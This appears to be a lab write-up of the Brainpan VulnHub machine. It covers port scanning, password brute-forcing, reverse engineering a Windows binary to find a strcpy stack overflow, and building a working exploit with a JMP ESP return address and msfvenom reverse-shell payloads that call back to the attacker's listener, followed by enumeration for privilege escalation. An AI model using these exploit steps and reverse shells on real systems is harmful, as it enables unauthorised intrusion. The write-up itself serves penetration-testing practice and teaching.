# Brainpan | VulnHub
https://www.vulnhub.com/entry/brainpan-1%2C51/

### 1. Scan
```bash
kali@kali:~/Desktop/osc$ sudo nmap -A -T4 -p- 10.1.1.16
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-06 03:21 EST
Nmap scan report for brainpan.lan (10.1.1.16)
Host is up (0.00088s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=11/6%Time=5FA507A0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 00:0C:29:87:51:5C (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.88 ms brainpan.lan (10.1.1.16)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.98 seconds
```
The machine is running two servers on ports 9999 and 10000. Port 9999 returned some sort of banner asking for a password. Meanwhile port 10000 is running a Python HTTP server.

### 2. Enumerate
Starting with port 9999 which can be connected to and interacted with using netcat.
```bash
kali@kali:~/Desktop/osc$ nc 10.1.1.16 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> test
                          ACCESS DENIED
^C
```
This seems to be some sort of custom interface asking for a password. I'm not expecting to get much here right now, but I can try to poke at it with a basic password list (see passcheck.py). Unfortunately no password is recovered this way.  
```bash
kali@kali:~/Desktop/osc/brainpan$ python3 passcheck.py 
0 passwords tried, on password: 123456
100 passwords tried, on password: qwert
200 passwords tried, on password: william
300 passwords tried, on password: 456789
400 passwords tried, on password: samantha1
500 passwords tried, on password: destiny
600 passwords tried, on password: hotmail
700 passwords tried, on password: creative
800 passwords tried, on password: barney
900 passwords tried, on password: hahaha1
1000 passwords tried, on password: baller1
1100 passwords tried, on password: italia
1200 passwords tried, on password: monkey12
1300 passwords tried, on password: pumpkin1
1400 passwords tried, on password: blue
...
9400 passwords tried, on password: zanzibar
9500 passwords tried, on password: mustang69
9600 passwords tried, on password: angelita
9700 passwords tried, on password: fuck13
9800 passwords tried, on password: purple5
9900 passwords tried, on password: 198
Exhausted.
```
Next, checking out port 10000, the HTTP homepage is a infographicy thing on safe coding. Gobusting shows there is a /bin directory with a file: brainpan.exe. Let's download this and take a closer look.
```bash
kali@kali:~/Desktop/osc/brainpan$ rabin2 -I brainpan.exe 
arch     x86
baddr    0x31170000
binsz    21190
bintype  pe
bits     32
canary   false
retguard false
class    PE32
cmp.csum 0x0000dda1
compiled Mon Mar  4 10:21:12 2013
crypto   false
endian   little
havecode true
hdr.csum 0x0000dda1
laddr    0x0
lang     c
linenum  true
lsyms    false
machine  i386
maxopsz  16
minopsz  1
nx       false
os       windows
overlay  true
pcalign  0
pic      false
relocs   true
signed   false
sanitiz  false
static   false                                
stripped true                     
subsys   Windows CUI                       
va       true
```
Since it's a Windows executable I take it across to my Windows machine and look at it in Ghidra.  

### 3. Reverse engineer the password
Looking at a few functions it soon becomes apparent that this program is the application running on port 9999, as the banner is found in the binary.
```
  local_400 = 
  "_|                            _|                                        \n
  _|_|_|    _|  _|_|   _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n
  _|    _|  _|_|      _|    _|  _|  _|    _| _|    _|  _|    _|  _|    _|\n
  _|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|   _|\n
  _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n
                                             _|                          \n

[________________________ WELCOME TO BRAINPAN _________________________]\n

ENTER THE PASSWORD                              \n
\n                          >> ";
```
So from here, if the password is hardcoded or obfuscated/encrypted in a way that is somehow reversible, we should be able to figure it out.  
This is the section of the main function in which connections are accepted, which I've annotated:
```c
    while (socket_desc = _accept@12(local_5b0,&local_5dc,&local_40c), socket_desc !=0xffffffff) {
      _printf("[+] received connection.\n");
      _memset(buffer,0,1000);
      len = _strlen(banner);
      _send@16(socket_desc,banner,len,0);					Send the banner
      _recv@16(socket_desc,buffer,1000,0);					Recieve the password (max 1000 chars)
      local_414 = _get_reply(buffer);						Pass the password to the get_reply function
      _printf("[+] check is %d\n",local_414);				Print the result of the function to the server prompt
      local_60c = _get_reply(buffer); 						Pass the password to the function a second time
      if (local_60c == 0) {
        len = _strlen(denied_text);
        _send@16(socket_desc,granted_text,len,0);			Here it's checking if the function returned a 0.
      }  													if so, return access granted. Else return denied.
      else {
        len = _strlen(granted_text);
        _send@16(socket_desc,denied_text,len,0);
      }
      _closesocket@4(socket_desc);
    }
```
From here we can check out the get_reply funciton.
```c
void __cdecl _get_reply(char *param_1)

{
  size_t sVar1; 													Password length
  char local_20c [520]; 											Password variable (local to function)
  
  _printf("[get_reply] s = [%s]\n",param_1);						Print the password to the server prompt
  _strcpy(local_20c,param_1); 										Copy the password into another variable
  sVar1 = _strlen(local_20c); 										Get the length of the password
  _printf("[get_reply] copied %d bytes to buffer\n",sVar1); 		Print the amount of bytes copied into the server prompt
  _strcmp(local_20c,"shitstorm\n"); 								Do a comparison of the user-provided password with the string "shitstorm"
  return;
}
```
So it would appear the password the server wants is "shitstorm". Additionally, note how the program copies the password, which is recieved as a maximum of 1000 bytes, into a local variable of only 520 bytes. This means a buffer overflow may be possible. For now though lets see if the discovered password gets us any access.
```
kali@kali:~/Desktop/osc/brainpan$ nc 10.1.1.16 9999
_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|                                           
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|                        
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> shitstorm
                          ACCESS GRANTED
```
The answer is unfortunately no. So looks like we have to take a closer look at the potential buffer overflow vuln.

### 4. Build an exploit
Firstly set up a Windows VM with a debugger and the brainpan executable - I'm using 32-bit Windows 7 with x32dbg, then I run the exe and attach to the process. Firstly send over a pattern and get where we can overwrite the EIP.
```bash
kali@kali:~/Desktop$ python -c "from pwn import cyclic; print(cyclic(600))" | nc 192.168.34.253 9999
```
This results in an access violation on 0x66616167, which is the EIP location.
```bash
kali@kali:~/Desktop$ python -c "from pwn import cyclic_find; print(cyclic_find(0x66616167))"
524
```
Next I need the location of the JMP ESP instruction.
```bash
kali@kali:~/Desktop/osc/brainpan$ objdump -D brainpan.exe | grep 'jmp' | grep esp
311712f3:       ff e4                   jmp    *%esp
```
Using this I can start to build an exploit. Firstly generate some shellcode. Note that since the strcpy function is being used, null bytes are out.
```bash
kali@kali:~/Desktop$ msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.34.142 LPORT=9999 --bad-chars '\x00' -f python > shellcode.py
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of python file: 1802 bytes
```
First I'm going to write 524 bytes, in then the JMP ESP instruction, followed by 16 NOPS and then add the shellcode in to complete the payload (see exploit.py).  
Start the handler:
```bash
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.34.142   yes       The listen address (an interface may be specified)
   LPORT     9999             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.34.142:9999
```
Execute the payload:
```bash
kali@kali:~/Desktop/osc/brainpan$ python exploit.py 
[+] Opening connection to 192.168.34.253 on port 9999: Done
[DEBUG] Received 0x298 bytes:
    '_|                            _|                                        \n'
    '_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n'
    '_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n'
    '_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n'
    '_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n'
    '                                            _|                          \n'
    '                                            _|\n'
    '\n'
    '[________________________ WELCOME TO BRAINPAN _________________________]\n'
    '                          ENTER THE PASSWORD                              \n'
    '\n'
    '                          >> '
[DEBUG] Sent 0x390 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000200  41 41 41 41  41 41 41 41  41 41 41 41  f3 12 17 31  │AAAA│AAAA│AAAA│···1│
    00000210  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    00000220  da c7 be 1e  55 3c 3e d9  74 24 f4 5a  33 c9 b1 56  │····│U<>·│t$·Z│3··V│
    00000230  31 72 18 83  c2 04 03 72  0a b7 c9 c2  da b5 32 3b  │1r··│···r│····│··2;│
    00000240  1a da bb de  2b da d8 ab  1b ea ab fe  97 81 fe ea  │····│+···│····│····│
    00000250  2c e7 d6 1d  85 42 01 13  16 fe 71 32  94 fd a5 94  │,···│·B··│··q2│····│
    00000260  a5 cd bb d5  e2 30 31 87  bb 3f e4 38  c8 0a 35 b2  │····│·01·│·?·8│··5·│
    00000270  82 9b 3d 27  52 9d 6c f6  e9 c4 ae f8  3e 7d e7 e2  │··='│R·l·│····│>}··│
    00000280  23 b8 b1 99  97 36 40 48  e6 b7 ef b5  c7 45 f1 f2  │#···│·6@H│····│·E··│
    00000290  ef b5 84 0a  0c 4b 9f c8  6f 97 2a cb  d7 5c 8c 37  │····│·K··│o·*·│·\·7│
    000002a0  e6 b1 4b b3  e4 7e 1f 9b  e8 81 cc 97  14 09 f3 77  │··K·│·~··│····│···w│
    000002b0  9d 49 d0 53  c6 0a 79 c5  a2 fd 86 15  0d a1 22 5d  │·I·S│··y·│····│··"]│
    000002c0  a3 b6 5e 3c  ab 7b 53 bf  2b 14 e4 cc  19 bb 5e 5b  │··^<│·{S·│+···│··^[│
    000002d0  11 34 79 9c  20 52 7a 72  8a 33 84 73  ea 1a 43 27  │·4y·│ Rzr│·3·s│··C'│
    000002e0  ba 34 62 48  51 c5 8b 9d  cf cf 1b de  a7 f2 55 b6  │·4bH│Q···│····│··U·│
    000002f0  b5 f2 4e 48  30 14 c0 06  12 89 a1 f6  d2 79 4a 1d  │··NH│0···│····│·yJ·│
    00000300  dd a6 6a 1e  34 cf 01 f1  e0 a7 bd 68  a9 3c 5f 74  │··j·│4···│···h│·<_t│
    00000310  64 39 5f fe  8c bd 2e f7  e5 ad 47 60  05 2e 98 05  │d9_·│··.·│··G`│·.··│
    00000320  05 44 9c 8f  52 f0 9e f6  94 5f 60 dd  a7 98 9e a0  │·D··│R···│·_`·│····│
    00000330  91 d3 a9 36  9d 8b d5 d6  1d 4c 80 bc  1d 24 74 e5  │···6│····│·L··│·$t·│
    00000340  4e 51 7b 30  e3 ca ee bb  55 be b9 d3  5b 99 8e 7b  │NQ{0│····│U···│[··{│
    00000350  a4 cc 8c 7c  5a 92 ba 24  32 6c fb d4  c2 06 fb 84  │···|│Z··$│2l··│····│
    00000360  aa dd d4 2b  1a 1d ff 63  32 94 6e c1  a3 a9 ba 87  │···+│···c│2·n·│····│
    00000370  7d a9 49 1c  8e d0 22 a3  6f 25 2b c0  70 25 53 f6  │}·I·│··"·│o%+·│p%S·│
    00000380  4d f3 6a 8c  90 c7 c8 9f  a7 6a 78 0a  c7 39 7a 1f  │M·j·│····│·jx·│·9z·│
    00000390
[*] Closed connection to 192.168.34.253 port 9999
```
Recieve the session.
```bash
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.34.142:9999 
[*] Sending stage (176195 bytes) to 192.168.34.253
[*] Meterpreter session 1 opened (192.168.34.142:9999 -> 192.168.34.253:49940) at 2020-11-08 22:42:03 -0500

meterpreter > shell
Process 1404 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Jack\Desktop>whoami
whoami
win-r9o8h1odou0\jack
```

### 5. Get a shell

Now the exploit is working I can attempt it on the real VM. I need to regenerate my shellcode using the IP for my bridged interface.
```bash
kali@kali:~/Desktop/osc/brainpan$ msfvenom --arch x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.1.1.74 LPORT=9999 --bad-chars '\x00' -f python > shellcode.py
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of python file: 1802 bytes
```
Then change the IP in the exploit script and re-run it, then get a session.
```bash
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.1.1.74        yes       The listen address (an interface may be specified)
   LPORT     9999             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.1.1.74:9999 
[*] Sending stage (176195 bytes) to 10.1.1.16
[*] Meterpreter session 1 opened (10.1.1.74:9999 -> 10.1.1.16:39393) at 2020-11-08 22:59:42 -0500

meterpreter > sysinfo
Computer        : brainpan
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : brainpan
Logged On Users : 1
Meterpreter     : x86/windows
```
Of course, this isn't actually a windows system. It's running using an emulator, which I'm hoping won't cause issues with meterpreter...
```
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 53 created.
Channel 2 created.
whoami
[-] core_channel_write: Operation failed: No process is on the other end of the pipe.
```
Ok, looks like there might be some problems unfortunately. I decide to go back and use another payload, I'm hoping wine emulation won't interfere with the using a linux payload instead.
```bash
kali@kali:~/Desktop/osc/brainpan$ msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=10.1.1.74 LPORT=9999 --bad-chars '\x00' -f python > shellcode.py
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of python file: 479 bytes
```
Catch the new shell in nc:
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.1.1.16 39395
whoami
puck
which python3
/usr/bin/python3
python3 -c "import pty; pty.spawn('/bin/bash');"
puck@brainpan:/home/puck$  
```

### 6. Enumeration
Checking out the home folder:
```bash
puck@brainpan:/home/puck$ ls -la
total 48
drwx------ 7 puck puck 4096 Mar  6  2013 .
drwxr-xr-x 5 root root 4096 Mar  4  2013 ..
-rw------- 1 puck puck    0 Mar  5  2013 .bash_history
-rw-r--r-- 1 puck puck  220 Mar  4  2013 .bash_logout
-rw-r--r-- 1 puck puck 3637 Mar  4  2013 .bashrc
drwx------ 3 puck puck 4096 Mar  4  2013 .cache
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .config
-rw------- 1 puck puck   55 Mar  5  2013 .lesshst
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .local
-rw-r--r-- 1 puck puck  675 Mar  4  2013 .profile
drwxrwxr-x 4 puck puck 4096 Nov  8 22:18 .wine
-rwxr-xr-x 1 root root  513 Mar  6  2013 checksrv.sh
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 web

puck@brainpan:/home/puck$ cat checksrv.sh
#!/bin/bash
# run brainpan.exe if it stops
lsof -i:9999
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep brainpan.exe | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
                killall wineserver
                killall winedevice.exe
        fi
        /usr/bin/wine /home/puck/web/bin/brainpan.exe &
fi 

# run SimpleHTTPServer if it stops
lsof -i:10000
if [[ $? -eq 1 ]]; then 
        pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
        if [[ ! -z $pid ]]; then
                kill -9 $pid
        fi
        cd /home/puck/web
        /usr/bin/python -m SimpleHTTPServer 10000
fi
```
Running processes:
```bash
puck@brainpan:/home/puck$ ps -aux
warning: bad ps syntax, perhaps a bogus '-'?
See http://gitorious.org/procps/procps/blobs/master/Documentation/FAQ
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.7   3488  1836 ?        Ss   21:51   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    21:51   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    21:51   0:00 [ksoftirqd/0]
root         4  0.0  0.0      0     0 ?        S    21:51   0:00 [kworker/0:0]
root         5  0.0  0.0      0     0 ?        S    21:51   0:00 [kworker/u:0]
root         6  0.0  0.0      0     0 ?        S    21:51   0:00 [migration/0]
root         7  0.0  0.0      0     0 ?        S    21:51   0:00 [watchdog/0]
root         8  0.0  0.0      0     0 ?        S<   21:51   0:00 [cpuset]
root         9  0.0  0.0      0     0 ?        S<   21:51   0:00 [khelper]
root        10  0.0  0.0      0     0 ?        S    21:51   0:00 [kdevtmpfs]
root        11  0.0  0.0      0     0 ?        S<   21:51   0:00 [netns]
root        12  0.0  0.0      0     0 ?        S    21:51   0:00 [sync_supers]
root        13  0.0  0.0      0     0 ?        S    21:51   0:00 [bdi-default]
root        14  0.0  0.0      0     0 ?        S<   21:51   0:00 [kintegrityd]
root        15  0.0  0.0      0     0 ?        S<   21:51   0:00 [kblockd]
root        16  0.0  0.0      0     0 ?        S<   21:51   0:00 [ata_sff]
root        17  0.0  0.0      0     0 ?        S    21:51   0:00 [khubd]
root        18  0.0  0.0      0     0 ?        S<   21:51   0:00 [md]
root        21  0.0  0.0      0     0 ?        S    21:51   0:00 [khungtaskd]
root        22  0.0  0.0      0     0 ?        S    21:51   0:00 [kswapd0]
root        23  0.0  0.0      0     0 ?        SN   21:51   0:00 [ksmd]
root        24  0.0  0.0      0     0 ?        S    21:51   0:00 [fsnotify_mark]
root        25  0.0  0.0      0     0 ?        S    21:51   0:00 [ecryptfs-kthre
root        26  0.0  0.0      0     0 ?        S<   21:51   0:00 [crypto]
root        35  0.0  0.0      0     0 ?        S<   21:51   0:00 [kthrotld]
root        37  0.0  0.0      0     0 ?        S    21:51   0:00 [kworker/u:2]
root        38  0.0  0.0      0     0 ?        S    21:51   0:00 [scsi_eh_0]
root        39  0.0  0.0      0     0 ?        S    21:51   0:00 [scsi_eh_1]
root        41  0.0  0.0      0     0 ?        S<   21:51   0:00 [binder]
root        61  0.0  0.0      0     0 ?        S<   21:51   0:00 [deferwq]
root        62  0.0  0.0      0     0 ?        S<   21:51   0:00 [charger_manage
root        63  0.0  0.0      0     0 ?        S<   21:51   0:00 [devfreq_wq]
root       159  0.0  0.0      0     0 ?        S<   21:51   0:00 [mpt_poll_0]
root       164  0.0  0.0      0     0 ?        S<   21:51   0:00 [mpt/0]
root       203  0.0  0.0      0     0 ?        S    21:51   0:00 [scsi_eh_2]
root       218  0.0  0.0      0     0 ?        S    21:51   0:00 [jbd2/sda1-8]
root       219  0.0  0.0      0     0 ?        S<   21:51   0:00 [ext4-dio-unwri
root       355  0.0  0.2   2820   612 ?        S    21:52   0:00 upstart-udev-br
root       357  0.0  0.5   3176  1384 ?        Ss   21:52   0:00 /sbin/udevd --d
102        452  0.0  0.4   3248  1028 ?        Ss   21:52   0:00 dbus-daemon --s
root       474  0.0  0.0      0     0 ?        S<   21:52   0:00 [ttm_swap]
syslog     481  0.0  0.5  30048  1320 ?        Sl   21:52   0:00 rsyslogd -c5
root       524  0.0  0.3   3128   944 ?        S    21:52   0:00 /sbin/udevd --d
root       525  0.0  0.4   3144  1000 ?        S    21:52   0:00 /sbin/udevd --d
root       590  0.0  0.0      0     0 ?        S<   21:52   0:00 [kpsmoused]
root       594  0.0  0.0      0     0 ?        S    21:52   0:00 [kworker/0:2]
root       699  0.0  0.2   2816   596 ?        S    21:52   0:00 upstart-socket-
root       741  0.0  0.8   5492  2056 ?        Ss   21:52   0:00 dhclient -1 -v 
root       763  0.0  1.4  18832  3584 ?        Ss   21:52   0:00 /usr/sbin/winbi
root       769  0.0  0.5  18832  1296 ?        S    21:52   0:00 /usr/sbin/winbi
root       839  0.0  0.3   4632   848 tty4     Ss+  21:52   0:00 /sbin/getty -8 
root       841  0.0  0.3   4632   852 tty5     Ss+  21:52   0:00 /sbin/getty -8 
root       847  0.0  0.3   4632   848 tty2     Ss+  21:52   0:00 /sbin/getty -8 
root       849  0.0  0.3   4632   852 tty3     Ss+  21:52   0:00 /sbin/getty -8 
root       852  0.0  0.3   4632   848 tty6     Ss+  21:52   0:00 /sbin/getty -8 
root       862  0.0  0.3   2620   800 ?        Ss   21:52   0:00 cron
daemon     863  0.0  0.0   2476   120 ?        Ss   21:52   0:00 atd
root       881  0.0  0.1   2656   356 ?        S    21:52   0:00 /usr/bin/daemon
root       882  0.0  0.2   2232   620 ?        S    21:52   0:00 /bin/sh /etc/in
root       942  0.0  0.3   4632   848 tty1     Ss+  21:52   0:00 /sbin/getty -8 
root       944  0.0  0.0      0     0 ?        S    21:52   0:00 [flush-8:0]
root       945  0.0  0.4   3180  1140 ?        S    21:52   0:00 CRON
puck       946  0.0  0.2   2232   544 ?        Ss   21:52   0:00 /bin/sh -c /hom
puck       947  0.0  0.5   5176  1288 ?        S    21:52   0:00 /bin/bash /home
puck       962  0.0  2.4  12396  6060 ?        S    21:52   0:00 /usr/bin/python
puck      1288  0.0  0.2   2232   540 ?        S    22:18   0:00 //bin/sh
puck      1336  0.0  2.1   8532  5276 ?        S    22:20   0:00 python3 -c impo
puck      1337  0.0  0.9   3972  2276 pts/0    Ss   22:20   0:00 /bin/bash
root      1404  0.0  0.1   2152   280 ?        S    22:22   0:00 sleep 600
puck      1423  0.0  0.4   3128  1048 pts/0    R+   22:24   0:00 ps -aux
```
Nothing really stands out here. Check out other users in /etc/passwd:
```bash
puck@brainpan:/home$ cd puck
cd puck
puck@brainpan:/home/puck$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash
anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash
puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash
```
There are two other users, both have home folders.
Checking sudo:
```bash
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```
Let's check out the anansi_util program.
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util 
sudo /home/anansi/bin/anansi_util 
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util network
sudo /home/anansi/bin/anansi_util network
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
    link/ether 00:0c:29:87:51:5c brd ff:ff:ff:ff:ff:ff
    inet 10.1.1.16/24 brd 10.1.1.255 scope global eth0
